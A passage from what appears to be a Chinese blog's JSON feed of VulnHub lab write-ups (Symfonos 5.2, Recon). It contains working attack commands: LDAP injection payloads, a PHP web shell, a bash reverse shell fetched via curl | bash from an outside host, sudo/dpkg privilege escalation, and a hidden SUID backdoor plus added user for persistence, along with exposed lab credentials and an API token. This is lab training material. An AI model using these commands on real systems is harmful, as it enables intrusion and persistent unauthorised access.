shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /home/trinity/</span><br><span class=\"line\">sudo -u trinty /bin/cp /bin/sh evil</span><br><span class=\"line\">sudo -u trinty evil</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-146.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"root-权限问题提权\"><a class=\"markdownIt-Anchor\" href=\"#root-权限问题提权\">#</a> root 权限问题提权</h3>\n<p>sudo -l 发现可以由 root 执行 /home/thrity/oracle<br>\n 但是此文件在此目录中并不存在，复制出来 bash，并利用 root 执行此文件</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cp /bin/bash /home/thrity/oracle</span><br><span class=\"line\">sudo /home/thrity/oracle</span><br></pre></td></tr></table></figure>\n<p>输入 id 之后，可见成功提权至 root</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-147.png\" width=\"620\" alt=\"Image\">\n<h3 id=\"sudo-su提权\"><a class=\"markdownIt-Anchor\" href=\"#sudo-su提权\">#</a> sudo su 提权</h3>\n<p>当拿到 root 权限之后，习惯性的翻阅 /etc/sudoers 文件，发现此文件中授予了 guest 用户执行 root 的所有权限，意味着 guest 用户可以 sudo su 并输入自己的密码切换到 root 账户</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /etc/sudoers | grep &quot;ALL=(ALL) ALL&quot;</span><br><span class=\"line\">su guest</span><br><span class=\"line\">sudo su</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-148.png\" width=\"520\" alt=\"Image\">\n<p>即意味着当得到 guest 用户 rbash 逃逸后，可以凭借 sudo su 直接提权为 root</p>\n<h3 id=\"suid-权限维持\"><a class=\"markdownIt-Anchor\" href=\"#suid-权限维持\">#</a> suid 权限维持</h3>\n<p>参考地址：<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5tY2h6LmNvbS5jbi9jbi9zZXJ2aWNlL3NhZmV0eS1sYWIvaW5mb18yNl9pdGVtaWRfNDA2MC5odG1s\">http://www.mchz.com.cn/cn/service/safety-lab/info_26_itemid_4060.html</span></p>\n<p>在正常的机器上找到 useradd 与 passwd 的位置，将其目录添加到靶机的 PATH 中，添加 kali 用户，并复制 bash，添加 s 权限，隐藏后门，方便提权</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">靶机</span></span><br><span class=\"line\">export PATH=/usr/sbin:$PATH</span><br><span class=\"line\">useradd kali &amp;&amp; passwd kali</span><br><span class=\"line\">cp /bin/bash /var/.hack</span><br><span class=\"line\">chmod 4755 /var/.hack</span><br><span class=\"line\">ls -Alh /var/.hack</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">攻击机</span></span><br><span class=\"line\">ssh kali@192.168.31.107</span><br><span class=\"line\">/var/.hack -p &amp; whoami</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-149.png\" width=\"470\" alt=\"Image\">\n<p>-&gt; 可以通过 kali 用户直接登陆此台服务器，并且利用我们遗留在服务器上具有 s 权限的后门文件进行升级 shell</p>\n",
            "tags": [
                "VULNHUB 1-10"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/106%20SYMFONOS/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/106%20SYMFONOS/",
            "title": "VULNHUB 6 SYMFONOS",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvc3ltZm9ub3MtNTIsNDE1Lw==\">https://www.vulnhub.com/entry/symfonos-52,415/</span><br>\n 教程链接地址 1：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9yZWFkeXNldGV4cGxvaXQud29yZHByZXNzLmNvbS8yMDIyLzAzLzAyL3Z1bG5odWItc3ltZm9ub3MtNS0yLw==\">https://readysetexploit.wordpress.com/2022/03/02/vulnhub-symfonos-5-2/</span><br>\n 教程链接地址 2：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FyeWFuZ3VlbnRobmVyL1Z1bG5odWItQ1RGLVdyaXRldXBz\">https://github.com/aryanguenthner/Vulnhub-CTF-Writeups</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 SYMFONOS：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<ol>\n<li>通过 netdiscover 扫描当前网卡里边有哪些机器<br>\n <code>sudo netdiscover -i eth0 -r 192.168.31.0/24</code></li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-084.png\" alt></p>\n<ol start=\"2\">\n<li>将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">shell</span></span><br><span class=\"line\">cat &gt; myip.txt &lt;&lt; EOF</span><br><span class=\"line\">192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33</span><br><span class=\"line\">192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP</li>\n</ol>\n<p><code>sudo nmap -PA 192.168.31.0/24 --excludefile myip.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-085.png\" width=\"450\" alt=\"Image\">\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.81</p>\n<h3 id=\"端口扫描\"><a class=\"markdownIt-Anchor\" href=\"#端口扫描\">#</a> 端口扫描</h3>\n<p>sudo nmap -A -p 1-1024 192.168.31.81 -oN /tmp/symfonos.txt</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-086.png\" width=\"480\" alt=\"Image\">\n<h3 id=\"gobuster-扫描目录\"><a class=\"markdownIt-Anchor\" href=\"#gobuster-扫描目录\">#</a> Gobuster 扫描目录</h3>\n<p>打开网站：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuODE=\">http://192.168.31.81</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-087.png\" alt></p>\n<ol>\n<li>目录扫描</li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-088.png\" width=\"480\" alt=\"Image\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuODEvYWRtaW4ucGhw\">http://192.168.31.81/admin.php</span><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-089.png\" alt></p>\n<p>尝试弱口令，注入等均无效</p>\n<ol start=\"2\">\n<li>加载字典，更详细的扫描</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gobuster dir -u http://192.168.31.81/ -w /usr/share/dirbuster/wordlists/directory-list-</span><br><span class=\"line\">2.3-medium.txt -x php,txt,html</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-090.png\" alt></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuODEvcG9ydHJhaXRzLnBocA==\">http://192.168.31.81/portraits.php</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-091.png\" alt></p>\n<h3 id=\"ldap-枚举\"><a class=\"markdownIt-Anchor\" href=\"#ldap-枚举\">#</a> LDAP 枚举</h3>\n<p>在 LDAP 上做一个快速枚举，看看是否有任何信息暴露给我们看</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">ldapsearch 使用</span></span><br><span class=\"line\">ldapsearch -h 192.168.31.81 -x -s namingcontexts</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-x Simple authentication</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-s scope one of base, one, sub or children (search scope)</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-H URI LDAP Uniform Resource Identifier(s)</span></span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-092.png\" width=\"400\" alt=\"Image\">\n<p>-&gt; 关键信息: dn:namingContexts, dc=symfonos, dc=local</p>\n<h3 id=\"ldap-注入\"><a class=\"markdownIt-Anchor\" href=\"#ldap-注入\">#</a> LDAP 注入</h3>\n<p>考虑到 ldap 在这台机器上运行，可尝试用 ldap 注入登录框<br>\n ldap 注入 poc：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ib29rLmhhY2t0cmlja3MueHl6L3BlbnRlc3Rpbmctd2ViL2xkYXAtaW5qZWN0aW9u\">https://book.hacktricks.xyz/pentesting-web/ldap-injection</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-093.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">payload</span></span><br><span class=\"line\">(&amp;(user=*)(password=*))</span><br><span class=\"line\">(&amp;(user=*)(&amp;)(password=*)(&amp;))</span><br><span class=\"line\">(&amp;(user=*)(|(&amp;)(pass=pwd))</span><br></pre></td></tr></table></figure>\n<p>通过 user=* 和 password=* 登陆到了该站点</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-094.png\" alt></p>\n<p>发现了一个 ssrf 跨服务请求伪造:<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuODEvaG9tZS5waHA/dXJsPWh0dHA6Ly8xOTIuMTY4LjMxLjgxL3BvcnRyYWl0cy5waHA=\">http://192.168.31.81/home.php?url=http://192.168.31.81/portraits.php</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-095.png\" alt></p>\n<p>分析在 http://192.168.31.81/admin.php 输入 user=*，pass=* 登陆成功的原因<br>\n我们必须记住，我们仍在处理 LDAP，当我们处理身份验证时，我们总是想检查页面是如何处理它的。在这种情况下，我们的目标是 admin.php 页面。</p>\n<p>我们认为 LFI\t有可能只是因为 URL\t与 localhost\t连接，以获取 Portraits.php 文件，利用 burpsuite 进行抓取 http://192.168.31.81/home.php?url admin.php 登陆时的数据包。</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-096.png\" alt></p>\n<p>-&gt; 用户名：admin 密码：qMDdyZh3cT6eeAWD，实际上用于连接 LDAP<br>\n <code>$bind = ldap_bind($ldap_ch, &quot;cn=admin,dc=symfonos,dc=local&quot;,&quot;qMDdyZh3cT6eeAWD&quot;);</code></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">ldap信息枚举</span></span><br><span class=\"line\">ldapsearch -h 192.168.31.81 -D &quot;cn=admin,dc=symfonos,dc=local&quot; -w &#x27;qMDdyZh3cT6eeAWD&#x27; -x -b &quot;dc=symfonos,dc=local&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-D binddn <span class=\"built_in\">bind</span> DN</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-w passwd <span class=\"built_in\">bind</span> password (<span class=\"keyword\">for</span> simple authentication)</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-x Simple authentication</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-b basedn base dn <span class=\"keyword\">for</span> search</span></span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-097.png\" width=\"470\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">获取到信息</span></span><br><span class=\"line\">admin e1NTSEF9VVdZeHZ1aEEwYldzamZyMmJodHhRYmFwcjllU2dLVm0=</span><br><span class=\"line\">zeus Y2V0a0tmNHdDdUhDOUZFVA==</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"built_in\">base64</span> 解码：</span></span><br><span class=\"line\">echo &quot;Y2V0a0tmNHdDdUhDOUZFVA==&quot; | base64 -d</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"built_in\">base64</span> 编码：</span></span><br><span class=\"line\">echo &quot;cetkKf4wCuHC9FET&quot; | base64</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-098.png\" width=\"540\" alt=\"Image\">\n<p>-&gt; admin:{SSHA}UWYxvuhA0bWsjfr2bhtxQbapr9eSgKVm<br>\n-&gt; zeus:cetkKf4wCuHC9FET</p>\n<h3 id=\"dpkg-shell-提权\"><a class=\"markdownIt-Anchor\" href=\"#dpkg-shell-提权\">#</a> dpkg-shell 提权</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">登录靶机</span></span><br><span class=\"line\">ssh zeus@192.168.31.81 </span><br><span class=\"line\">cetkKf4wCuHC9FET</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-099.png\" width=\"560\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看相关权限设置</span></span><br><span class=\"line\">sudo -l</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">发现dpkg拥有root权限，可通过dpkg提权</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">详细网址：https://gtfobins.github.io/gtfobins/dpkg/</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-100.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">输入以下命令：</span></span><br><span class=\"line\">sudo dpkg -l </span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在弹出来的交互式中继续输入!/bin/sh</span> </span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-101.png\" alt></p>\n<h3 id=\"ssh-密钥对维权\"><a class=\"markdownIt-Anchor\" href=\"#ssh-密钥对维权\">#</a> SSH 密钥对维权</h3>\n<p>提前准备好配对好的私钥和公钥，将公钥发到靶机</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scp parallels@192.168.31.135:~/.ssh/id_rsa.pub ~/.ssh/</span><br><span class=\"line\">cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys &amp;&amp; rm - f ~/.ssh/id_rsa.pub</span><br><span class=\"line\">ll | grep id</span><br><span class=\"line\">ssh root@192.168.31.127 -i ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-102.png\" alt></p>\n<p>-&gt; 免密成功，下次可直接登录</p>\n",
            "tags": [
                "VULNHUB 1-10"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/107%20RECON/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/107%20RECON/",
            "title": "VULNHUB 7 RECON",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvcmVjb24tMSw0Mzgv\">https://www.vulnhub.com/entry/recon-1,438/</span><br>\n 教程链接地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9yZWFkeXNldGV4cGxvaXQud29yZHByZXNzLmNvbS8yMDIyLzAzLzA2L3Z1bG5odWItcmVjb24tMS8=\">https://readysetexploit.wordpress.com/2022/03/06/vulnhub-recon-1/</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 RECON：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<ol>\n<li>\n<p>通过 netdiscover 扫描当前网卡里边有哪些机器<br>\n <code>sudo netdiscover -i eth0 -r 192.168.31.0/24</code></p>\n</li>\n<li>\n<p>将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描</p>\n</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">shell</span></span><br><span class=\"line\">cat &gt; myip.txt &lt;&lt; EOF</span><br><span class=\"line\">192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33</span><br><span class=\"line\">192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP<br>\n <code>sudo nmap -PA 192.168.31.0/24 --excludefile myip.txt</code></li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-103.png\" width=\"600\" alt=\"Image\">\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.230</p>\n<ol start=\"4\">\n<li>确认靶机 ip 开放的端口信息</li>\n</ol>\n<p><code>sudo nmap -A -p 1-1024 192.168.31.230 -oN /tmp/recon.txt</code> <br>\n<img data-src=\"/N1h1l157/VULNHUB/image-104.png\" width=\"540\" alt=\"Image\"></p>\n<p>-&gt; 靶机开放端口 22,80</p>\n<h3 id=\"wpscan-扫描-wordpress\"><a class=\"markdownIt-Anchor\" href=\"#wpscan-扫描-wordpress\">#</a> wpscan 扫描 wordpress</h3>\n<p>1）目录扫描</p>\n<p><code>dirsearch -u http://192.168.31.230/</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-105.png\" alt></p>\n<p>-&gt; 敏感网址：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjMwL3dwLWxvZ2luLnBocD9yZWRpcmVjdF90bz1odHRwJTNBJTJGJTJGMTkyLjE2OC4zMS4yMzAlMkZ3cC1hZG1pbiUyRiZhbXA7cmVhdXRoPTE=\">http://192.168.31.230/wp-login.php?redirect_to=http%3A%2F%2F192.168.31.230%2Fwp-admin%2F&amp;reauth=1</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjMwL3dwLWxvZ2luLnBocA==\">http://192.168.31.230/wp-login.php</span><br>\n 对此网址进行弱口令爆破，sql 注入均无效果</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-106.png\" alt></p>\n<ol start=\"2\">\n<li>wordpress 进行扫描用户</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">获取到wpscan的api token：</span></span><br><span class=\"line\">https://wpscan.com/profile?pricingList=1</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过以下命令枚举wordpress的用户名：</span></span><br><span class=\"line\">wpscan --url http://192.168.31.230 --enumerate u --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-107.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 用户 1:recon  用户 2:reconauthor</p>\n<ol start=\"3\">\n<li>wordpress 针对已知用户扫描密码</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过以下命令爆破wordpress用户名recon reconauthor的密码：</span></span><br><span class=\"line\">wpscan --url http://192.168.31.230/ - U &#x27;recon reconauthor&#x27; -P /usr/share/wordlists/rockyou.txt --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-108.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 用户：reconauthor 密码：football7</p>\n<ol start=\"4\">\n<li>登陆 wordpress 后台<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjMwL3dwLWxvZ2luLnBocA==\"> http://192.168.31.230/wp-login.php</span><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-109.png\" alt><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-110.png\" alt></li>\n</ol>\n<h3 id=\"msf-测试-wordpress\"><a class=\"markdownIt-Anchor\" href=\"#msf-测试-wordpress\">#</a> msf 测试 wordpress</h3>\n<ol>\n<li>msf 自带 exploit/unix/webapp/ 下的模块进行利用<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-111.png\" alt></li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfconsole</span><br><span class=\"line\">use exploit/unix/webapp/wp_admin_shell_upload</span><br><span class=\"line\">set password **football7**</span><br><span class=\"line\">set rhosts 192.168.31. 230</span><br><span class=\"line\">set username **reconauthor**</span><br><span class=\"line\">set targeturi /</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<p>-&gt; 认证成功，但上传失败</p>\n<h3 id=\"后台上传-poc\"><a class=\"markdownIt-Anchor\" href=\"#后台上传-poc\">#</a> 后台上传 poc</h3>\n<ol>\n<li>从网站后台寻找突破</li>\n</ol>\n<p>wordpress 后台上传文件 poc：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDY5ODE=\">https://www.exploit-db.com/exploits/46981</span><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-112.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;&lt;html&gt;I’m X_T, do you know me ?&lt;/html&gt;&quot; &gt; index.html</span><br><span class=\"line\">echo &quot;&lt;?php echo system($_GET[&#x27;X_T&#x27;]); ?&gt;&quot; &gt; index.php</span><br><span class=\"line\">zip poc.zip index.html index.php</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-113.png\" width=\"520\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">依次按下列按钮点击</span></span><br><span class=\"line\">Create a new Post -&gt; Select `Add block` -&gt; E-Learning -&gt; Upload the poc.zip -&gt;</span><br><span class=\"line\">Insert as: Iframe -&gt; Insert</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-114.png\" alt><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-115.png\" alt><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-116.png\" alt><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-117.png\" alt><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-118.png\" alt></p>\n<p>-&gt; <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjMwL3dwLWNvbnRlbnQvdXBsb2Fkcy9hcnRpY3VsYXRlX3VwbG9hZHMvcG9jOS9pbmRleC5odG1s\">http://192.168.31.230/wp-content/uploads/articulate_uploads/poc9/index.html</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-119.png\" alt></p>\n<p>-&gt; RCE 地址：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjMwL3dwLWNvbnRlbnQvdXBsb2Fkcy9hcnRpY3VsYXRlX3VwbG9hZHMvcG9jOS9pbmRleC5waHA/WF9UPWxz\">http://192.168.31.230/wp-content/uploads/articulate_uploads/poc9/index.php?X_T=ls</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-120.png\" alt></p>\n<ol start=\"2\">\n<li>通过 RCE 漏洞反弹 shell</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">构造反弹shell地代码并开启http服务</span></span><br><span class=\"line\">cat &gt; shell.sh &lt;&lt; EOF</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">! /bin/bash</span></span><br><span class=\"line\">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.31.135/4444 0&gt;&amp;1&#x27;</span><br><span class=\"line\">EOF</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在靶机上执行：</span></span><br><span class=\"line\">curl http://www.chentuo.asia/shell.sh | bash</span><br></pre></td></tr></table></figure>\n<p>-&gt; 即在 url 地址上构造：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjMwL3dwLWNvbnRlbnQvdXBsb2Fkcy9hcnRpY3VsYXRlX3VwbG9hZHMvcG9jOS9pbmRleC5waHA/WF9UPWN1cmwlMjBodHRwOi8vd3d3LmNoZW50dW8uYXNpYS9zaGVsbC5zaCUyMCU3QyUyMGJhc2g=\">http://192.168.31.230/wp-content/uploads/articulate_uploads/poc9/index.php?X_T=curl http://www.chentuo.asia/shell.sh | bash</span><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-121.png\" alt></p>\n<p><img 